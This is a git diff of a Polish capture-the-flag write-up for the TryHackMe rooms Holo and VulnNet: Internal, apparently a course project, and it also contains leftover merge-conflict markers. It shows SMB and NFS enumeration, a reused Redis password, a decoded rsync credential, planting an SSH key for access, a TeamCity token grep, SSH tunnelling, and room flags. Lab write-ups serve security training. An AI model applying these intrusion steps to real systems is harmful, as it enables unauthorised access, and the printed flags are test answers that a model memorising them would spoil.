@@ -1,10 +1,10 @@
 # Projek 3 z kursu Cybersecutryty w SDAcademy.
 ## Założenia projektu:
 
-1. Dwie obowiąskowe maszyny na portalu e-lerning TryHackMe.com:
+1. Dwie obowiązkowe maszyny na portalu e-lerning TryHackMe.com:
     * https://tryhackme.com/room/hololive
     * https://tryhackme.com/room/vulnnetinternal
-2. Trzy osobowa grupa:
+2. Trzyosobowa grupa:
     
     [Justyna A.](https://github.com/Enwalme)
 
@@ -34,7 +34,7 @@
 └─# enum4linux 10.200.111.250
 ```
 
-2. Na lokalnym linux-ie tworze katalog Holo i przechodzę do niego. Kolejno tworzę plik do którego będę zapisywać wszystkie dane. Następnie poleceniem cat i grep wyszukuję interesujących danych.
+2. Na lokalnym linux-ie tworze katalog Holo i przechodzę do niego. Kolejno tworzę plik, do którego będę zapisywać wszystkie dane. Następnie poleceniem ```cat``` i ```grep``` wyszukuję interesujące dane.
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe]
 └─$ mkdir Holo           
@@ -73,7 +73,7 @@ gobuster vhost -u http://ip-10-200-111-33.eu-west-1.compute.internal:80/ -wlist_
 
     UWAGA: 
     Adresy IP maszyny atakowanej będą się różnić na zrzutach ekranu gdyż 
-    było tworzone podczas krótkich sesii a nie pojedyńczego rozwiązania tego pokoju.
+    było tworzone podczas krótkich sesji a nie pojedyńczego rozwiązania tego pokoju.
 
 1. Na początek zaczynam od użycia narzędzia nmap.
 
@@ -85,7 +85,7 @@ Z zapisanego pliku z nmap-a ```gerp-uje``` otwarte porty.
 
 ![:(](/screens/VulnNet__nmap_grep_open.jpg)
 
-Dalszą opserwację skupiam na SMB (porty 139 i 445). Za pomocą ```enum4linux``` sprawdzam co tam się znajduję.
+Dalszą obserwację skupiam na SMB (porty 139 i 445). Za pomocą ```enum4linux``` sprawdzam co tam się znajduję.
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
 └─$ enum4linux -a <IP_atakowanej_masz> 
@@ -94,7 +94,7 @@ Dalszą opserwację skupiam na SMB (porty 139 i 445). Za pomocą ```enum4linux``
 
 Za pomocą ```enum4linux``` znalazłem również użytkownika ```sys-internal```
 
-2. Za pomocą polecenia ```smbclient``` sprawdzam i pobieram wszystkie zasobi z katalogu ```//IP_maszyny/shares```.
+2. Za pomocą polecenia ```smbclient``` sprawdzam i pobieram wszystkie zasoby z katalogu ```//IP_maszyny/shares```.
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
 └─$ smbclient -N //<IP_atakowanej_masz>/shares
@@ -116,8 +116,8 @@ Po przejrzeniu pobranych plików znalazłem pierwszą flagę.
 
     NFS to system typu klient/serwer, który umożliwia użytkownikom dostęp do plików przez sieć i traktowanie ich tak, jakby znajdowały się w lokalnym katalogu plików.
 
-za pomocą polecenia ```mkdir``` tworzę katalog do którego zamontuję udostępnione przez NFS katalogi.
-Następnie pobieram i przeglądam wszystkie dane. Zwracam uwagę na plik ```redis.conf``` w nim znajduę klucz do usługi ```Redis```.
+za pomocą polecenia ```mkdir``` tworzę katalog, do którego zamontuję udostępnione przez NFS katalogi.
+Następnie pobieram i przeglądam wszystkie dane. Zwracam uwagę na plik ```redis.conf```, w nim znajduę klucz do usługi ```Redis```.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -286,12 +286,6 @@ requirepass "B65Hx562F@ggAZ@F"
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe]
 └─$ redis-cli -h <IP_atakowanej_masz> -a "B65Hx562F@ggAZ@F"
 Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
-10.10.161.43:6379> ls
-(error) ERR unknown command 'ls'
-10.10.161.43:6379> id
-(error) ERR unknown command 'id'
-10.10.161.43:6379> cd internal flag
-(error) ERR unknown command 'cd'
 10.10.161.43:6379> KEYS *
 1) "tmp"
 2) "internal flag"
@@ -303,22 +297,12 @@ Warning: Using a password with '-a' or '-u' option on the command line interface
 "THM{ff8e518addbbddb74531a724236a8221}"
 10.10.161.43:6379> get "tmp"
 "temp dir..."
-10.10.161.43:6379> cd "tmp"
-(error) ERR unknown command 'cd'
 10.10.161.43:6379> get "temp dir..."
 (nil)
-10.10.161.43:6379> cd "tmp/temp dir..."
-(error) ERR unknown command 'cd'
 10.10.161.43:6379> get "int"
 "10 20 30 40 50"
-10.10.161.43:6379> get "marketlist"
-(error) WRONGTYPE Operation against a key holding the wrong kind of value
 10.10.161.43:6379> get "authilist"
 (nil)
-10.10.161.43:6379> get "authlist"
-(error) WRONGTYPE Operation against a key holding the wrong kind of value
-10.10.161.43:6379> LEANGE "authlist" 0 999
-(error) ERR unknown command 'LEANGE'
 10.10.161.43:6379> LRANGE "authlist" 0 999
 1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
 2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
@@ -333,7 +317,7 @@ Uzyskuję możliwość logowania za pomocą ```rsync```.
     QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== - Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v - Possible algorithms: Base64 Encoded String
 ![:(](/screens/v_hashes.png)
 
-4. Rsync - po zalogowaniu się okazało się, że możemy zobaczyć plik txt z kolejną flagą ale nie miałem pomysłu jak mogę go pobrać lub otworzyć. W rozwiązaniu tego plroblemu bardzo pomocny okazał się [ChatGPT](https://chat.openai.com/chat). Pobralem załą zawartość do której dawał mi dostęp ```rsync```. Po pobraniu katalogu ```files``` za pomocą polecenia ```sudo chmod -R 777 sys-internal``` zmieniłem uprawnienia dla wszystkich plików. W ten sposób zdobyłem kolejna flage.
+4. Rsync - po zalogowaniu się okazało się, że możemy zobaczyć plik txt z kolejną flagą ale nie miałem pomysłu jak mogę go pobrać lub otworzyć. W rozwiązaniu tego plroblemu bardzo pomocny okazał się [ChatGPT](https://chat.openai.com/chat). Pobrałem całą zawartość do której dawał mi dostęp ```rsync```. Po pobraniu katalogu ```files``` za pomocą polecenia ```sudo chmod -R 777 sys-internal``` zmieniłem uprawnienia dla wszystkich plików. W ten sposób zdobyłem kolejną flage.
 ![UPs...](/screens/v_pytanie_chatgpt_o_pobieranie_przez_rsync.gif)
 
 Ja:
@@ -404,18 +388,18 @@ drwxr-xr-x          4,096 2021/02/01 07:53:22 Videos
 
 rsync -r rsync://rsync-connect@<IP_atakowanej_masz>/files/ ./rsync
 ```
-Za pomoca polecenia ```ssh-keygen``` po wygenerowaniu kluczy publiczny i prywatrny zmieniam nazwe klucza publicznego za pomoca polecenia ```cp id-rsa.pub auhorized_keys```
-nastepnie kopiuje klucz publiczny poleceniem:
+Za pomoca polecenia ```ssh-keygen``` po wygenerowaniu kluczy publiczny i prywatny zmieniam nazwę klucza publicznego za pomocą polecenia ```cp id-rsa.pub auhorized_keys```
+Nastepnie kopiuję klucz publiczny poleceniem:
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
 └─$ rsync -r authorized_keys rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal/.ssh/
 ```
 
-Podobnie robię z aplikacją ```LinEnum``` którą pobieram z [GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) na własną maszynę poleceniem:
+Podobnie robię z aplikacją ```LinEnum```, którą pobieram z [GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) na własną maszynę poleceniem:
 ```
 git clone https://github.com/rebootuser/LinEnum.git
 ```
-Następnie za pomocą ```rsync``` kopiuję plik ```LinEnum.sh``` i jak już zaloguję się przez ssh za pomocą wcześniej utworzonych pary kluczy tworzę raport który pobieram w celu analizy.
+Następnie za pomocą ```rsync``` kopiuję plik ```LinEnum.sh``` i jak już zaloguję się przez ssh za pomocą wcześniej utworzonych pary kluczy tworzę raport, który pobieram w celu analizy.
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
 └─$ rsync -r LinEnum.sh rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal/.ssh/
@@ -574,6 +558,7 @@ sys-internal@vulnnet-internal:/TeamCity$ grep -iR token /TeamCity/logs/ 2>/dev/n
 
 ```
 ![...](/screens/v_token_tc.png)
+<<<<<<< HEAD
 
 6. Za pomocą przekierowania ```ssh``` poleceniem ```ssh -i id_rsa -L 4444:localhost:8111 sys-internal@<IP_atakowanej_maszyny>``` przekierowałem pracę "lokalnego hosta" atakowanej maszyny na stój lokalny host.
 ![Oops!…I_Did_It_Again](/screens/v_przekierowanie_ssh.png)
@@ -610,3 +595,5 @@ THM{e8996faea46df09dba5676dd271c60bd}
 ```
 
 ![FINISH_HIM](/screens/v_final.png)
+=======
+>>>>>>> 98bb33e1bf7b1f55e6163be8fe62d733bcc25f32
